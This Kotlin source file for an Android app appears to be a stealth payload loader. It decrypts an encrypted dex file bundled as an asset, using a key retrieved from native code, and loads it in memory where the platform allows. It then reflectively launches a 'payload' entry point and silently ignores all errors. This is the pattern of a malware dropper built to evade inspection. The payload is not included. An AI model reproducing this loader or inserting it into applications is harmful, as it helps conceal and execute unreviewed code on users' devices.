package com.sp.loader

import android.content.Context
import dalvik.system.DexClassLoader
import dalvik.system.InMemoryDexClassLoader
import java.io.File
import java.nio.ByteBuffer
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

object DexLoader {
    private var payloadClassLoader: ClassLoader? = null

    fun loadPayload(ctx: Context): ClassLoader {
        payloadClassLoader?.let { return it }
        val encrypted = ctx.assets.open("payload.dex.enc").use { it.readBytes() }
        val iv = encrypted.copyOfRange(0, 12)
        val ct = encrypted.copyOfRange(12, encrypted.size)
        val key = NativeKey.key()
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        cipher.init(Cipher.DECRYPT_MODE, SecretKeySpec(key, "AES"),
            GCMParameterSpec(128, iv))
        val dexBytes = cipher.doFinal(ct)

        val buffer = ByteBuffer.allocateDirect(dexBytes.size)
        buffer.put(dexBytes); buffer.position(0)

        val loader = if (android.os.Build.VERSION.SDK_INT >= 26) {
            InMemoryDexClassLoader(buffer, javaClass.classLoader)
        } else {
            val tmp = File(ctx.codeCacheDir, "p_${System.nanoTime()}.dex")
            tmp.writeBytes(dexBytes)
            DexClassLoader(tmp.absolutePath, ctx.codeCacheDir.absolutePath,
                null, javaClass.classLoader)
        }
        payloadClassLoader = loader
        return loader
    }

    fun launch(ctx: Context) {
        try {
            val loader = loadPayload(ctx)
            val cls = loader.loadClass("com.sp.payload.Entry")
            cls.getMethod("start", Context::class.java).invoke(null, ctx)
        } catch (_: Throwable) {}
    }
}